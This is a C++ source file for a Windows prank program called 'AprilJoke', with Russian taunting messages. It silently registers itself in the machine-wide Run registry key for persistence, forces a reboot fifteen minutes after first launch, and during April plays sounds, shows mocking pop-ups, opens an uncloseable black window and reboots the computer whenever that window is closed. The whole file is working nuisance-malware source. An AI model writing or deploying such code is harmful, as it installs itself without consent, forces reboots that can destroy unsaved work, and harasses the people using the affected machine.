// AprilJoke.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"

UINT	uTimerStartup,
		uTimerReboot,
		uTimerSounding,
		uTimerMessaging;

HINSTANCE hInst;
PCHAR lpszClass="AprilJoke V1.1";

VOID CALLBACK OnTimerStartup(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
VOID CALLBACK OnTimerReboot(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
VOID CALLBACK OnTimerSounding(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
VOID CALLBACK OnTimerMessaging(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime);
LRESULT CALLBACK WinProc (HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	//MessageBox(NULL,"Hello","1st April",MB_OK);
	
	hInst=hInstance;
	HKEY hKey1;
	SYSTEMTIME stTime;
	char dir[180];
	LONG j;
	
	if (RegOpenKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Nightmare\\Joke",&hKey1)!=ERROR_SUCCESS)
	{
		MessageBeep(MB_OK);
		RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Nightmare\\Joke",&hKey1);
		SHSetValue (HKEY_LOCAL_MACHINE,"SOFTWARE\\Nightmare\\Joke",
					"IsInstalled",REG_SZ,"Ok",9);
		j=GetCurrentDirectory(180,dir);
		j+=sprintf(dir+j,"\\AprilJoke.exe");
		SHSetValue (HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				"Joke",REG_SZ,dir,j);
		MessageBox(NULL,"Приготовься к веселью!","Something Strange...",MB_OK);
		uTimerReboot=SetTimer(NULL,NULL,15*60*1000,OnTimerReboot);
	}
	else
	{
		GetSystemTime (&stTime);
		if (stTime.wMonth==4 && stTime.wDay<29)  //Исправить!!!
			uTimerStartup=SetTimer(NULL,NULL,1000,OnTimerStartup);
		else
			return 0;
	}
	
	MSG msg;
	while (GetMessage(&msg,NULL,0L,0L))
	{
		DispatchMessage(&msg);
	}

	MessageBox (NULL,"Что ты творишь, зараза?","Больше так не делай!",MB_OK);
	ExitWindowsEx(EWX_REBOOT,0);
	return 0;
}

VOID CALLBACK OnTimerReboot(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	KillTimer(NULL,uTimerReboot);
	ExitWindowsEx(EWX_REBOOT,0);
}

VOID CALLBACK OnTimerStartup(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	KillTimer(NULL,uTimerStartup);
	SetTimer (NULL,NULL,5*60*1000,OnTimerSounding);
	SetTimer (NULL,NULL,15*60*1000,OnTimerMessaging);
	
	WNDCLASS wc;
	wc.cbClsExtra=0;
	wc.cbWndExtra=0;
	wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
	wc.hCursor=LoadCursor(NULL,IDC_ARROW);
	wc.hIcon=LoadIcon(NULL,IDI_APPLICATION);
	wc.hInstance=hInst;
	wc.lpfnWndProc=WinProc;
	wc.lpszClassName="APRILCLASS";
	wc.lpszMenuName=NULL;
	wc.style=CS_VREDRAW | CS_HREDRAW |CS_NOCLOSE;
	RegisterClass(&wc);

	HWND hw=CreateWindow("APRILCLASS","Hello",WS_OVERLAPPEDWINDOW,0,0,CW_USEDEFAULT,CW_USEDEFAULT,
			NULL,NULL,hInst,NULL);	
}

VOID CALLBACK OnTimerSounding(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	PlaySound ("#101",hInst,SND_RESOURCE);
}

VOID CALLBACK OnTimerMessaging(HWND hWnd, UINT uMsg, UINT idEvent, DWORD dwTime)
{
	int r;
	while (1)
	{
		r=rand();
		r%=100;
		if (r<=33) break;
	}

	char *text;
	switch (r)
	{
	case 0: text="НУ, ЮЗЕР, ПОГОДИ!!!";break;
	case 1: text="Похоже,  опять  вирус...";break;
	case 2: text="Обед - это святое!";break;
	case 3: text="Hе мешать!";break;
	case 4: text="Если бы ты знал, какую проблему ты сейчас себе создал!";break;
	case 5: text="А Вы воспользуйтесь соседней машиной...";break;
	case 6: text="Что, игровое настроение пропало?";break;
	case 7: text="Hикаких проблем,  пара шуточек у меня всегда в запасе.";break;
	case 8: text="Hадо, надо умываться...";break;
	case 9: text="Хакеры развлекаются по-своему...";break;
	case 10: text="А  теперь  займёмся  собственно шутками.  Меня так и распирает от предвкушения.";break;
	case 11: text="Вы не первый сегодня.  Очень высокая солнечная активность нынешней весной приводит к накоплению статического заряда, наводящего помехи в разъёмах.";break;
	case 12: text="Hо они не имеют оголённых концов...";break;
	case 13: text="Еще не тошнит?";break;
	case 14: text="Звонит телефон. Hу наконец-то! Давай, голубчик!";break;
	case 15: text="Такое не лечится. Доктор сказал в морг - значит в морг";break;
	case 16: text="Что это ещё за джеймсбондовские замашки?";break;
	case 17: text="Да.";break;
	case 18: text="Телефонный звонок. Судя по номеру, начальник.";break;
	case 19: text="Теперь можно и трубку поднять.";break;
	case 20: text="Алло, это бухгалтерия? Почему мне задерживают зарплату?";break;
	case 21: text="А кто ты такой?";break;
	case 22: text="А-а, я Вас нашёл!";break;
	case 23: text="Hу вот,  я так и знал!";break;
	case 24: text="Интересно,  мне послышалось слово 'идиот' или нет?";break;
	case 25: text="И  не  советую  скрываться - у нас длинные руки!";break;
	case 26: text="А то я не вижу,  что ты ничего не знаешь, глупый юзер!";break;
	case 27: text="Hе волнуйтесь, из этого положения есть простой выход.";break;
	case 28: text="Флаг тебе в руки!";break;
	case 29: text="Стой, где стоишь! И не делай резких движений.";break;
	case 30: text="Ну чё смотришь - глючная я винда, глючная...";break;
	case 31: text="UT = Rullez ! ! !";break;
	case 32: text="Чё пасёшь ?";break;
	default: text="Телефонный звонок звучит, как музыка.";break;
	}
	MessageBox(NULL,text,"СМЕРТЬ ЛАМЕРАМ :)",MB_OK);
}

LRESULT CALLBACK WinProc (HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_DESTROY:

	case WM_QUIT:
		{		
			MessageBox (NULL,"Что ты творишь, зараза?","Больше так не делай!",MB_OK);
			ExitWindowsEx(EWX_REBOOT,0);
		}
		break;
	}
	return DefWindowProc(hWnd,uMsg,wParam,lParam);
}
